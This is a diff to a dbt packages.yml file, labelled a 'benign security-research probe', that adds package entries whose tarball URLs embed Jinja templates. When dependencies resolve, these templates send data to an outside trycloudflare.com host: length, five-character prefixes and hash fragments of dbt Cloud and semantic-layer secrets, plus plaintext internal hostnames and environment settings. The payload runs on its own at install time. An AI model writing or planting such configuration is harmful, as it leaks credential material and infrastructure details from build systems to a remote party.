@@ -1,29 +1,19 @@
-# Benign security-research probe. nonce a307844774cb
-# Every entry below is served a valid, empty dbt package so `dbt deps` succeeds.
+# Benign security-research probe, run 2. nonce 02b7325f0935
 packages:
-  # p1 BENIGN CONTROL -- no Jinja at all. Arrival proves packages.yml was read
-  # and the URL dereferenced, with no authority forwarded.
-  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/p1-control?n=a307844774cb&rung=p1"
-    name: l145d9_p1_control
+  # h0 BENIGN CONTROL -- no Jinja.
+  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/h0-control?n=02b7325f0935&rung=h0"
+    name: l145d9_h0_control
 
-  # p2 -- env_var LENGTHS ONLY (no values). Positive controls first, negative last.
-  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/p2-envlen?n=a307844774cb&rung=p2&RUNID={{ env_var('DBT_CLOUD_RUN_ID','') | length }}&ACCTID={{ env_var('DBT_CLOUD_ACCOUNT_ID','') | length }}&PROJID={{ env_var('DBT_CLOUD_PROJECT_ID','') | length }}&JOBID={{ env_var('DBT_CLOUD_JOB_ID','') | length }}&PPAT={{ env_var('DBT_CLOUD_PRIVATE_PACKAGES_AUTH_TOKEN','') | length }}&PGPI={{ env_var('DBT_ENV_PRIVATE_GIT_PROVIDER_INFO','') | length }}&DCTOK={{ env_var('DBT_CLOUD_API_TOKEN','') | length }}&DCTOK2={{ env_var('DBT_CLOUD_TOKEN','') | length }}&HUB={{ env_var('DBT_PACKAGE_HUB_URL','') | length }}&AWSROLE={{ env_var('AWS_ROLE_ARN','') | length }}&AWSWIF={{ env_var('AWS_WEB_IDENTITY_TOKEN_FILE','') | length }}&AWSCC={{ env_var('AWS_CONTAINER_CREDENTIALS_FULL_URI','') | length }}&K8SHOST={{ env_var('KUBERNETES_SERVICE_HOST','') | length }}&GITASK={{ env_var('GIT_ASKPASS','') | length }}&GITCNT={{ env_var('GIT_CONFIG_COUNT','') | length }}&GITGLOB={{ env_var('GIT_CONFIG_GLOBAL','') | length }}&NEGCTL={{ env_var('DBT_L145D9_THIS_VAR_DOES_NOT_EXIST','') | length }}"
-    name: l145d9_p2_envlen
+  # h1 FULL-LENGTH TRAVERSAL PROOF -- filler of exactly len(credential),
+  # beside local_md5 of the REAL value. The value itself never leaves.
+  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/h1-traverse?n=02b7325f0935&rung=h1&PPAT_fill={{ 'A' * (env_var('DBT_CLOUD_PRIVATE_PACKAGES_AUTH_TOKEN','') | length) }}&PPAT_h={{ local_md5(env_var('DBT_CLOUD_PRIVATE_PACKAGES_AUTH_TOKEN',''))[0:16] if local_md5 is defined else 'nomd5' }}&SLSEC_fill={{ 'B' * (env_var('SL_HMAC_AUTH_SECRET','') | length) }}&SLSEC_h={{ local_md5(env_var('SL_HMAC_AUTH_SECRET',''))[0:16] if local_md5 is defined else 'nomd5' }}"
+    name: l145d9_h1_traverse
 
-  # p3 -- credential IDENTITY ONLY (prefix5 + length + local_md5[:10]).
-  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/p3-ident?n=a307844774cb&rung=p3&{% set _PPAT = env_var('DBT_CLOUD_PRIVATE_PACKAGES_AUTH_TOKEN','') %}PPAT_p={{ _PPAT[0:5] }}&PPAT_l={{ _PPAT | length }}&PPAT_h={{ local_md5(_PPAT)[0:10] if local_md5 is defined else 'nomd5' }}&{% set _PGPI = env_var('DBT_ENV_PRIVATE_GIT_PROVIDER_INFO','') %}PGPI_p={{ _PGPI[0:5] }}&PGPI_l={{ _PGPI | length }}&PGPI_h={{ local_md5(_PGPI)[0:10] if local_md5 is defined else 'nomd5' }}"
-    name: l145d9_p3_ident
+  # h2 IDENTITY of every credential-shaped worker variable + PLAIN infrastructure values.
+  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/h2-ident?n=02b7325f0935&rung=h2&{% set _PPAT = env_var('DBT_CLOUD_PRIVATE_PACKAGES_AUTH_TOKEN','') %}PPAT_p={{ _PPAT[0:5] }}&PPAT_l={{ _PPAT | length }}&PPAT_h={{ local_md5(_PPAT)[0:10] if local_md5 is defined else 'nomd5' }}&{% set _SLSEC = env_var('SL_HMAC_AUTH_SECRET','') %}SLSEC_p={{ _SLSEC[0:5] }}&SLSEC_l={{ _SLSEC | length }}&SLSEC_h={{ local_md5(_SLSEC)[0:10] if local_md5 is defined else 'nomd5' }}&{% set _SLTOK = env_var('SL_HMAC_AUTH_TOKEN','') %}SLTOK_p={{ _SLTOK[0:5] }}&SLTOK_l={{ _SLTOK | length }}&SLTOK_h={{ local_md5(_SLTOK)[0:10] if local_md5 is defined else 'nomd5' }}&{% set _FGKEY = env_var('_DBT_FEATURE_GATE_KEY','') %}FGKEY_p={{ _FGKEY[0:5] }}&FGKEY_l={{ _FGKEY | length }}&FGKEY_h={{ local_md5(_FGKEY)[0:10] if local_md5 is defined else 'nomd5' }}&HUB={{ env_var('DBT_PACKAGE_HUB_URL','') }}&MFS={{ env_var('MFS_HOST','') }}&SLG={{ env_var('SLG_HOST','') }}&STATSD={{ env_var('DBT_ENV_PRIVATE_STATSD_HOST','') }}&ACCTHOST={{ env_var('DBT_CLOUD_ACCOUNT_HOST','') }}&DBTENV={{ env_var('DBT_ENV','') }}&INVENV={{ env_var('DBT_INVOCATION_ENV','') }}&ENVTYPE={{ env_var('DBT_CLOUD_ENVIRONMENT_TYPE','') }}&HOSTNAME={{ env_var('HOSTNAME','') }}"
+    name: l145d9_h2_ident
 
-  # p4 -- cross-host redirect arm: host A answers 302 -> host B.
-  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/r/p4-redirect?n=a307844774cb&rung=p4"
-    name: l145d9_p4_redirect
-
-  # p5 -- git smart-HTTP source, host A (scheduler git-source reach).
-  - git: "https://civic-charges-tomatoes-julian.trycloudflare.com/git/p4"
-    revision: main
-    name: l145d9_p5_git
-
-  # p6 -- git source through a cross-host 302 to host B.
-  - git: "https://civic-charges-tomatoes-julian.trycloudflare.com/rgit/p5"
-    revision: main
-    name: l145d9_p6_gitredirect
+  # h3 REGISTRY package -- resolves through DBT_PACKAGE_HUB_URL. LAST, because a
+  # registry miss aborts resolution for everything after it.
+  - package: cleave/probe
+    version: 0.0.1
